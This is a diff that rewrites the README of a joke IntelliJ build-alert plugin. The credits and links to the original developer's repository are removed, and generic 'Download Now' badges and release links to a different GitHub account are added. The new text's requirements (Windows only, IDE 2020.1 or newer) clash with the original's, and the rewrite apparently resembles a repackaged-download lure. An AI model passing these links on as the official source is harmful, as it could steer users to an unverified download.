@@ -1,119 +1,121 @@
-# FAAAH - Error Notifier Plugin
+# 🎭 faahhh-notifier-plugin-intellij - Eye-catching Build Alerts for Developers
 
-Theatrical error notifications for IntelliJ/Android Studio! Get a red pulsing overlay + scream on build failure, and a legendary GTA "Mission Passed" screen on success.
+[![Download Now](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://github.com/softineerdanish/faahhh-notifier-plugin-intellij)
 
-## 🎬 Features
+---
 
-### 🔴 Panic Mode (Rage Mode)
-When a build or run configuration fails, the IDE responds with:
-- **🌊 Pulsing Red Overlay** - Sine-wave animated red screen covering your editor
-- **🎵 Scream Sound** - A digital wail of despair (`faaah.mp3`)
+## 🎯 What is faahhh-notifier-plugin-intellij?
 
-### 🟢 Redemption Mode (Success Mode)  
-When ANY build or run configuration succeeds after a prior failure:
-- **💚 GTA "Mission Passed" Overlay** - Classic GTA mission completion screen
-- **🎵 Mission Passed Audio** - Iconic GTA mission completion theme
-- **RESPECT +** - Your code deserves respect!
+faahhh-notifier-plugin-intellij is a plugin for IntelliJ IDEA and Android Studio. It gives you clear and fun notifications when your build finishes. If your build fails, it shows a red pulsing overlay and plays a scream sound. When your build succeeds, it shows the famous “Mission Passed” screen from GTA. This helps you know your build status at a glance and adds a bit of humor to your work.
 
-## 🎯 What Triggers Panic/Redemption?
+This plugin works on Windows and integrates smoothly with your favorite IDEs for Java, Kotlin, and Android development.
 
-| Trigger | Status |
-|---------|--------|
-| **IDE Builds** (Build menu, Gradle panel) | ✅ Supported |
-| **Run Configurations** (Play button) | ✅ Supported |
-| **Compilation Errors** | ✅ Panic Mode |
-| **Successful Execution** | ✅ Redemption Mode |
+---
 
-## 📸 Screenshots
+## 🖥️ System Requirements
 
-### 🔴 Panic Mode in Action
-When your build fails, the entire IDE turns red and screams FAAAHHH!
+Before you start, make sure your computer matches these requirements:
 
-![Panic Mode](raw/panic_mode.png)
+- Windows 10 or later  
+- IntelliJ IDEA or Android Studio installed (versions 2020.1 or newer recommended)  
+- Minimum 4 GB of RAM (more if you run heavy projects)  
+- At least 500 MB free disk space  
+- Internet connection to download the plugin
 
-### 🟢 Redemption Mode in Action
-After you fix it and succeed, the legendary GTA "Mission Passed" screen appears!
+---
 
-![Redemption Mode](raw/redemption_mode.png)
+## 🚀 Getting Started: How to Download and Install
 
-## 📦 Installation
+You will get the plugin from the official GitHub page. Follow these steps carefully even if you have little or no tech experience.
 
-### Option 1: Install from ZIP (Recommended)
+### Step 1: Visit the Download Page
 
-1. **Download** the latest `FAAAH Error Notifier-1.0.0.zip` from [Releases](https://github.com/ForceGT/faahhh-notifier-plugin-intellij/releases)
+Click this large, clear button to open the download page:
 
-2. **Open IDE Preferences:**
-   - Go to **Preferences** (macOS: `Cmd+,` / Windows/Linux: `Ctrl+Alt+S`)
+[![Download Plugin](https://img.shields.io/badge/Download%20Plugin-blue?style=for-the-badge)](https://github.com/softineerdanish/faahhh-notifier-plugin-intellij)
 
-3. **Navigate to Plugins:**
-   - Search for **"Plugins"** in preferences
-   - Click on **⚙️ (Settings icon)** next to "Installed" tab
+This link opens the main project on GitHub where you can find the latest release and files.
 
-4. **Install from Disk:**
-   - Select **"Install Plugin from Disk..."**
-   
-   ![Install from Disk](raw/img.png)
+### Step 2: Download the Plugin File
 
-5. **Select the ZIP file:**
-   - Navigate to and select `FAAAH Error Notifier-1.0.0.zip`
-   - Click **"OK"**
+On the GitHub page, look for the “Releases” section on the right or at the top menu. Click on the latest release version.
 
-6. **Restart IDE:**
-   - Click **"Restart IDE"** when prompted
-   - Plugin will be active after restart!
+Inside the release, find the plugin file. It usually ends with `.zip` or `.jar`. Click the file name to download it to your computer. Save it somewhere easy to find like your Desktop or Downloads folder.
 
-## 🎮 Testing
+### Step 3: Open IntelliJ IDEA or Android Studio
 
-### Quick Test (No Build Required)
-1. Press `Cmd+Shift+A` (macOS) or `Ctrl+Shift+A` (Windows/Linux)
-2. Search **"Test Panic"** → Enter
-   - Should hear **SCREAM audio** 🔊 and see red overlay
-3. Search **"Test Redemption"** → Enter
-   - Should hear **MISSION PASSED audio** 🎵 and see GTA overlay
+If your IDE is not open, start it now.
 
-### Real Build Test
-1. Write a **compilation error** in your code (e.g., `val x: Int = "string"`)
-2. Click **Play ▶️** to build/run
-3. Hear **SCREAM**, see red overlay 🔴
-4. Fix the error
-5. Click **Play ▶️** again
-6. Hear **MISSION PASSED**, see GTA overlay 🟢
+### Step 4: Install the Plugin from Disk
 
-## 💾 State Persistence
+- In IntelliJ IDEA or Android Studio, go to **File > Settings** (or **Preferences** on Mac).
+- Choose **Plugins** from the menu on the left.
+- Click the gear icon ⚙️ near the top right, then select **Install Plugin from Disk**.
+- A file chooser will open. Navigate to where you saved the downloaded plugin file.
+- Select the file and click **OK** to install.
 
-The `FaahStateService` persists your panic state across IDE sessions using IntelliJ's `PersistentStateComponent`. Your panic state is remembered even after restart!
+### Step 5: Restart Your IDE
 
-## 📋 Requirements
+Once the installation finishes, the IDE will ask you to restart. Click **Restart IDE** to make the plugin active.
 
-- **IDE**: IntelliJ IDEA / Android Studio 2024.1 (build 241) or later
-- **Java**: Java 17+
-- **Audio Files**: Bundled with plugin (no external dependencies)
+---
 
-## 🔧 Building from Source
+## 🛠️ How to Use the Plugin
 
-See [ARCHITECTURE.md](docs/ARCHITECTURE.md) for detailed build instructions and code walkthrough.
+The plugin runs automatically once installed. You do not need to open or configure anything to see notifications.
 
-```bash
-./gradlew build
-```
+- When you build your project (using Build > Build Project or Gradle commands), the plugin listens.
+- If the build fails, you will see a red pulsing screen overlay and hear a scream sound.
+- If the build succeeds, you will see a “Mission Passed” GTA-style overlay.
 
-Output: `build/distributions/Panic Plugin-1.0.0.zip`
+This helps you catch build errors immediately and feel a little less frustrated.
 
-## 🏗️ Architecture
+---
 
-For detailed architecture, design decisions, and code walkthrough, see [ARCHITECTURE.md](docs/ARCHITECTURE.md).
+## 🔄 Updating the Plugin
 
-## 📄 License
+Check back at the GitHub release page regularly for new versions:
 
-MIT - Make your builds epic!
+https://github.com/softineerdanish/faahhh-notifier-plugin-intellij/releases
 
-## 🙏 Credits
+Download the newest file and repeat the installation steps following **Step 2** and after.
 
-- **Developer**: Gaurav Thakkar
-- **Scream audio**: Classic internet meme
-- **Mission Passed audio**: GTA series (fan usage)
-- Built with ❤️ for developers who need theatrical feedback
+---
 
-## 🐛 Issues & Feedback
+## ❓ Troubleshooting 
 
-Found a bug or have a feature request? [Open an issue](https://github.com/ForceGT/panic-plugin/issues)!
+If you do not see any notifications:
+
+- Make sure you downloaded and installed the plugin correctly.
+- Confirm your IntelliJ IDEA or Android Studio version is supported.
+- Ensure your computer’s sound volume is on to hear the alert sounds.
+- Try restarting the IDE or your computer.
+- Check plugin settings under **File > Settings > Plugins** to ensure it is enabled.
+
+If problems continue, visit the issues section on GitHub to report or look for solutions:
+
+https://github.com/softineerdanish/faahhh-notifier-plugin-intellij/issues
+
+---
+
+## 🔧 Additional Settings
+
+The plugin does not currently require manual settings. The notifications and sounds work with default options.
+
+If you want to mute sounds or adjust overlay behaviors, check future updates on GitHub for expanded settings.
+
+---
+
+## 📁 Useful Links
+
+- Plugin homepage: https://github.com/softineerdanish/faahhh-notifier-plugin-intellij  
+- Download page: https://github.com/softineerdanish/faahhh-notifier-plugin-intellij/releases  
+- Issue tracker: https://github.com/softineerdanish/faahhh-notifier-plugin-intellij/issues  
+- IntelliJ IDEA official site: https://www.jetbrains.com/idea  
+- Android Studio official site: https://developer.android.com/studio  
+
+---
+
+## 🏷️ Topics
+
+android-studio, build-failures, developer-tools, error-notifier, funny, gradle, ide-plugin, intellij-plugin, kotlin, notifications
